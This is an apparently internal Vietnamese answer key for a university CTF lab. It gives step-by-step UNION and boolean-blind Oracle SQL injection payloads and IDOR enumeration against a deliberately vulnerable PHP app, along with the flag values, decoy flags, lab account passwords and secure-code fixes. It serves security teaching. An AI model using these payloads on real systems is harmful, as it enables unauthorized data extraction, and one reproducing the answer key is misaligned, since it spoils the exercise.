# 🔐 ANSWER KEY – DBS401 Group 07 (NỘI BỘ – KHÔNG NỘP CÔNG KHAI)

> Chỉ dùng trong lab CTF DBS401 nội bộ. Không chia sẻ trước khi thi/demo.

---

## 🚩 FLAG MASTER LIST

| Flag | Giá trị |
|------|---------|
| Flag 1 | `DBS401{SQL_1nj3ct10n_0r4cl3!}` |
| Flag 2 | `DBS401{1DOR_Tr4ns_4cc3ss_Fl4w!}` |
| Flag 3 | `DBS401{Bl1nd_B00l_0r4cl3_X3rt!}` |

## 🎭 FAKE FLAG LIST (để không bị nhầm)

| Fake Flag | Vị trí | Mục đích |
|-----------|--------|----------|
| `DBS401{FAKE_union_select_lol}` | FAKE_FLAGS table | Bẫy người mới dùng UNION đơn giản |
| `DBS401{FAKE_IDOR_wrong_student}` | FAKE_FLAGS table + decoy enrollment | Bẫy người tìm sai student ID |
| `DBS401{FAKE_blind_wrong_key_xd}` | ADMIN_SECRETS key=oracle_flag_3_backup | Bẫy người dùng sai key |
| `DBS401{FAKE_archived_flag_123}` | FLAG_ARCHIVE table | Bẫy người tìm nhầm bảng |
| `DBS401{FAKE_IDOR_notreal}` | ENROLLMENTS student_id=4 nội bộ note | Bẫy IDOR stage 1 |

---

## ═══════════════════════════════════════════════
## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Easy  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`  
**Tài khoản cần:** Bất kỳ (student1, teacher1, admin đều được)

---

### Bước 1 – Xác nhận injection point

```
GET /search.php?q='
```
→ Nếu nhận được `Search failed. Please check your input.` → lỗi SQL được suppress.  
→ Injection tồn tại (không phải "blocked").

```
GET /search.php?q=Software' AND '1'='1
```
→ Trả về kết quả bình thường → injection confirmed.

```
GET /search.php?q=Software' AND '1'='2
```
→ Không có kết quả → boolean behavior works.

---

### Bước 2 – Xác định số cột và kiểu dữ liệu

Query gốc có 3 cột: `student_id (NUMBER)`, `full_name (VARCHAR2)`, `major (VARCHAR2)`

Thử UNION với NULL để xác định:

```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
```
→ Nếu 3 NULLs cho ra 1 row → query có 3 cột ✓

Kiểm tra kiểu cột:
```sql
' UNION SELECT 1,NULL,NULL FROM DUAL WHERE '1'='1
```
→ Cột 1 là NUMBER (nhận 1 OK)

```sql
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
```
→ Cột 2 là VARCHAR2 ✓

---

### Bước 3 – Khám phá Oracle metadata

**Tìm tên DB user:**
```sql
' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
```
→ Trả về: `DBS401_USER`

**Liệt kê tất cả bảng:**
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
```
→ Nhận được: `USERS, STUDENTS, COURSES, ENROLLMENTS, AUDIT_LOGS...`

Tiếp tục enumerate (dùng NOT IN để lấy thêm):
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS') AND ROWNUM<=5 AND '1'='1
```
→ Nhận được: `FLAGS, ADMIN_SECRETS, CONFIG_STORE, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE`

⚠️ `FLAG_ARCHIVE` trông giống bảng flag → **đây là DECOY**!

---

### Bước 4 – Lấy Flag Part A từ FLAGS table

```sql
' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE part_order=1 AND is_active=1 AND flag_code='FL1_PART_A' AND ROWNUM=1 AND '1'='1
```
→ Nhận được: `flag_part = 4442533430317B53514C5F`

> **Decode hex:**  
> `4442533430317B53514C5F` → ASCII  
> 44=D, 42=B, 53=S, 34=4, 30=0, 31=1, 7B={, 53=S, 51=Q, 4C=L, 5F=_  
> → **`DBS401{SQL_`**

⚠️ Cũng có `FL_DECOY_B` (is_active=1) → kết quả là chuỗi base64 vô nghĩa → **FAKE!**

---

### Bước 5 – Lấy Flag Part B từ AUDIT_LOGS

```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
```
→ Nhận được metadata_note:  
`{"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context","ref":"FLAG_COMPONENT_B"}`

> **Decode:** Trường `fragment` = `_n01tc3jn1`  
> Hint: `reverse_for_context` → đảo ngược chuỗi  
> `_n01tc3jn1` → đảo → **`1nj3ct10n_`**

---

### Bước 6 – Lấy Flag Part C từ CONFIG_STORE

Liệt kê CONFIG_STORE:
```sql
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE is_public=0 AND ROWNUM=1 AND '1'='1
```
→ Lấy tiếp tục với NOT IN để tìm tất cả private configs.

Tìm key `sys_alpha_marker`:
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
```
→ Nhận được: `MHI0Y2wzIX0=`

> **Decode base64:** `MHI0Y2wzIX0=` → **`0r4cl3!}`**

⚠️ `sys_beta_marker` có giá trị khác → **FAKE!**

---

### Bước 7 – Ghép Flag 1

```
Part A (hex decode):   DBS401{SQL_
Part B (reverse):      1nj3ct10n_
Part C (base64 decode): 0r4cl3!}

FLAG 1 = DBS401{SQL_ + 1nj3ct10n_ + 0r4cl3!}
       = DBS401{SQL_1nj3ct10n_0r4cl3!}
```

✅ **FLAG 1: `DBS401{SQL_1nj3ct10n_0r4cl3!}`**

---

### Cách vá lỗi

```php
// Vulnerable:
$sql = "... WHERE full_name LIKE '%$keyword%' ...";

// Secure:
$param = '%' . $keyword . '%';
$sql   = "... WHERE full_name LIKE :kw ...";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 2 – IDOR + Broken Access Control
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Medium  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:**  
- `GET /dbs401-oracle-app/transcript.php?ref=TXN-XXX-YYYY-SZ`  
- `GET /dbs401-oracle-app/audit.php?log_id=N`  
**Tài khoản cần:** student1 (hoặc bất kỳ logged-in user)

---

### Bước 1 – Quan sát transcript_ref hợp lệ

1. Login student1.
2. Dashboard → click vào transcript: `TXN-001-2024-S1`
3. Quan sát URL pattern: `TXN-{student_id:03d}-{year}-S{semester}`

---

### Bước 2 – Enumerate các transcript_ref

Thử tuần tự:
```
TXN-002-2024-S1 → Kết quả của student khác (IDOR thành công)
TXN-003-2024-S1 → Kết quả bình thường
TXN-004-2024-S1 → internal_note có chuỗi lạ: "SYSTEM_REF: UkVKVE..."
```

> ⚠️ `TXN-004-2024-S1` chứa **FAKE data** trong internal_note. Đây là bẫy!  
> Chuỗi base64 ở đây **KHÔNG phải** flag thật.

Thử range 040-060:
```
TXN-050-2024-S1 → 403 Access denied (simulated restriction)
TXN-055-2024-S1 → 403
```

Thử range xung quanh 099:
```
TXN-098-2024-S1 → 404 Not found
TXN-099-2024-S1 → 🎯 CÓ KẾT QUẢ! (hidden student)
TXN-100-2024-S1 → 404 Not found
```

---

### Bước 3 – Lấy Flag Part A từ transcript TXN-099-2024-S1

```
GET /dbs401-oracle-app/transcript.php?ref=TXN-099-2024-S1
```

Response hiển thị:
```
System Note: CLASSIFIED_DATA: REJTNDAxezFET1JfVHI0bnNf
Admin Log Ref: LOG-8  (link đến audit.php?log_id=8)
```

> **Decode base64:** `REJTNDAxezFET1JfVHI0bnNf` → **`DBS401{1DOR_Tr4ns_`**

---

### Bước 4 – Lấy Flag Part B từ Audit Log (IDOR trên audit.php)

Click link `LOG-8` hoặc truy cập:
```
GET /dbs401-oracle-app/audit.php?log_id=8
```

> ⚠️ `log_id=8` là ví dụ; số thực tế phụ thuộc vào thứ tự insert trong seed.sql.  
> Thực tế: `admin_ref_id` hiển thị trên trang transcript → dùng số đó.

Response:
```json
{
  "action": "TRANSCRIPT_EXPORT_HIDDEN",
  "metadata_note": "{\"export_ref\":\"EXP-HIDDEN-F2\",\"fragment_b\":\"}!w4lF_ss3cc4\",\"decode_hint\":\"reverse_this_part\",\"related\":\"TXN-099-2024-S1\"}"
}
```

> **Decode:** `fragment_b` = `}!w4lF_ss3cc4`  
> `decode_hint` = `reverse_this_part` → đảo ngược  
> `}!w4lF_ss3cc4` đảo → **`4cc3ss_Fl4w!}`**

---

### Bước 5 – Ghép Flag 2

```
Part A (base64 decode): DBS401{1DOR_Tr4ns_
Part B (reverse):       4cc3ss_Fl4w!}

FLAG 2 = DBS401{1DOR_Tr4ns_ + 4cc3ss_Fl4w!}
       = DBS401{1DOR_Tr4ns_4cc3ss_Fl4w!}
```

✅ **FLAG 2: `DBS401{1DOR_Tr4ns_4cc3ss_Fl4w!}`**

---

### Phân biệt real vs fake

| TXN-ref | Student | internal_note | Verdict |
|---------|---------|---------------|---------|
| TXN-001-2024-S1 | Nguyen Van An | Normal enrollment | Real student, no flag |
| TXN-004-2024-S1 | Pham Thi Dung | `UkVKVE...` (fake base64) | **DECOY** |
| TXN-099-2024-S1 | CTF Hidden Target | `REJTNDAx...` (real base64) | **REAL** |

---

### Cách vá lỗi

```php
// Vulnerable – không kiểm tra ownership:
WHERE e.transcript_ref = '$ref'

// Secure – có ownership check:
WHERE e.transcript_ref = :ref
  AND u.user_id = :current_uid  -- session user must own the record
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 3 – Boolean-Based Blind SQL Injection
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng (DBS401):** Hard  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `GET /dbs401-oracle-app/secret_check.php?key=VALUE`  
**Tài khoản cần:** Bất kỳ logged-in user (student1 OK)

---

### Bước 1 – Xác nhận injection point

```http
GET /secret_check.php?key=sys_master_key
```
→ `{"status":"found","message":"Secret key verified. Record exists."}`

```http
GET /secret_check.php?key=nonexistent_key
```
→ `{"status":"not_found","message":"Invalid or inactive secret key."}`

Thử injection:
```http
GET /secret_check.php?key=sys_master_key' AND '1'='1
```
→ `found` → TRUE condition → **injection confirmed!**

```http
GET /secret_check.php?key=sys_master_key' AND '1'='2
```
→ `not_found` → FALSE condition → **boolean discrimination works!**

---

### Bước 2 – Tìm đúng secret_key cần extract

Thử các key có thể:
```http
GET /secret_check.php?key=oracle_flag_3_primary
```
→ `found` ← **KEY ĐÚNG!**

```http
GET /secret_check.php?key=oracle_flag_3_backup
```
→ `found` ← Cũng found nhưng đây là FAKE (is_active=1 cũng)

> Phân biệt bằng cách dùng SUBSTR để check ký tự đầu:  
> Key thật có ký tự đầu là 'D' (ASCII 68)  
> Key fake có ký tự đầu là 'F' (ASCII 70)

```http
GET /secret_check.php?key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1
```
→ `found` → ký tự 1 = 'D' → **đây là key thật**

```http
GET /secret_check.php?key=oracle_flag_3_backup' AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1
```
→ `not_found` → ký tự 1 ≠ 'D' → **đây là FAKE key**

---

### Bước 3 – Xác định độ dài giá trị

```http
GET /secret_check.php?key=oracle_flag_3_primary' AND LENGTH(encrypted_value)=18 AND '1'='1
```
→ `found` → **LENGTH = 18** ✓

---

### Bước 4 – Extract từng ký tự (thủ công / script)

Sử dụng payload:
```
oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,{POS},1))={ASCII_VAL} AND '1'='1
```

| Pos | ASCII | Char |
|-----|-------|------|
| 1   | 68    | D    |
| 2   | 66    | B    |
| 3   | 83    | S    |
| 4   | 52    | 4    |
| 5   | 48    | 0    |
| 6   | 49    | 1    |
| 7   | 123   | {    |
| 8   | 66    | B    |
| 9   | 108   | l    |
| 10  | 49    | 1    |
| 11  | 110   | n    |
| 12  | 100   | d    |
| 13  | 95    | _    |
| 14  | 66    | B    |
| 15  | 48    | 0    |
| 16  | 48    | 0    |
| 17  | 108   | l    |
| 18  | 95    | _    |

→ Part A: **`DBS401{Bl1nd_B00l_`**

Dùng script tự động:
```bash
cd tools/
python3 exploit_flag3_local.py --host 127.0.0.1 --port 80
```

---

### Bước 5 – Lấy Flag Part B từ CONFIG_STORE (qua Vuln 1 SQLi hoặc SYSTEM_HINTS)

Dùng SQLi từ Vuln 1 để query CONFIG_STORE:
```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='oracle_flag_3_suffix' AND '1'='1
```
→ Nhận được: `307234636C335F58337274217D`

Hoặc query SYSTEM_HINTS:
```sql
' UNION SELECT 1,hint_value,hint_key FROM SYSTEM_HINTS WHERE hint_key='flag3_suffix_hint' AND '1'='1
```
→ Nhận gợi ý: "CONFIG_STORE holds the suffix. Key: oracle_flag_3_suffix. Value is hex-encoded."

> **Decode hex:** `307234636C335F58337274217D`  
> 30=0, 72=r, 34=4, 63=c, 6C=l, 33=3, 5F=_, 58=X, 33=3, 72=r, 74=t, 21=!, 7D=}  
> → **`0r4cl3_X3rt!}`**

---

### Bước 6 – Ghép Flag 3

```
Part A (blind extract): DBS401{Bl1nd_B00l_
Part B (hex decode):    0r4cl3_X3rt!}

FLAG 3 = DBS401{Bl1nd_B00l_ + 0r4cl3_X3rt!}
       = DBS401{Bl1nd_B00l_0r4cl3_X3rt!}
```

✅ **FLAG 3: `DBS401{Bl1nd_B00l_0r4cl3_X3rt!}`**

---

### Cách vá lỗi

```php
// Vulnerable:
$sql = "SELECT COUNT(*) FROM ADMIN_SECRETS WHERE secret_key = '$key' AND is_active = 1";

// Secure:
if (!preg_match('/^[a-zA-Z0-9_]{1,64}$/', $key)) { /* reject */ }
$sql  = "SELECT COUNT(*) AS cnt FROM ADMIN_SECRETS WHERE secret_key = :sk AND is_active = 1";
$stmt = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':sk', $key);
oci_execute($stmt);
```

---

## 📸 Screenshots cần chụp khi demo

| STT | Cần chụp gì |
|-----|-------------|
| 1 | search.php với payload UNION SELECT (xác nhận injection) |
| 2 | Kết quả query USER_TABLES (danh sách bảng) |
| 3 | Kết quả query FLAGS → flag_part hex |
| 4 | Kết quả query AUDIT_LOGS → fragment reversed |
| 5 | Kết quả query CONFIG_STORE → base64 value |
| 6 | Python decode + ghép → Flag 1 |
| 7 | transcript.php?ref=TXN-099-2024-S1 (IDOR) |
| 8 | internal_note chứa base64 Part A |
| 9 | audit.php?log_id=N → metadata fragment_b |
| 10 | Ghép Flag 2 |
| 11 | secret_check.php → found/not_found responses |
| 12 | Payload boolean TRUE vs FALSE |
| 13 | Script Python running char extraction |
| 14 | Ghép Flag 3 cuối cùng |
| 15 | Secure versions so sánh trước/sau vá |

---

## 🔑 Tài khoản test

| Username | Password | Role |
|----------|----------|------|
| admin | Admin@DBS401!2024 | admin |
| teacher1 | Teacher@123 | teacher |
| student1 | Student@123 | student |
| student2 | Student@123 | student |
| student3 | Student@123 | student |

---

*Tài liệu này chỉ dùng nội bộ nhóm DBS401 – Group 07.*
